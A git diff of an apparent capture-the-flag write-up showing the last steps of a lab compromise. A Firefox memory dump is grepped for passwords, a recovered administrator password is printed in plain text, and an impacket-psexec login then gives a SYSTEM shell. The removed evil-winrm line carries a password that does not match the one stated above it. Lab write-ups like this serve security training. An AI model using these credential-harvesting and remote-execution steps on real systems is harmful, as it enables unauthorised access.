@@ -185,12 +185,19 @@ command:```strings firefox.exe_231011_124132.dmp| grep "password"```
 
 nice nice, we got the admin password. 
 
-Now, lets use winrm to connect
+Now, lets use psexec to connect
 
 username:```administrator```      password:```4dD!5}x/re8]FBuZ```
 
-command:```evil-winrm -u administrator -i 10.129.94.141 -p "4dDpwd}x/re8]FBuZ"```
+command:```impacket-psexec administrator@10.129.94.202```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eea8a90c-64f4-459a-a4c8-b9d10cb5f1e6)
+
+We spwned a shell as ```nt authority\system```, this means we have successfully pwned this box.
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
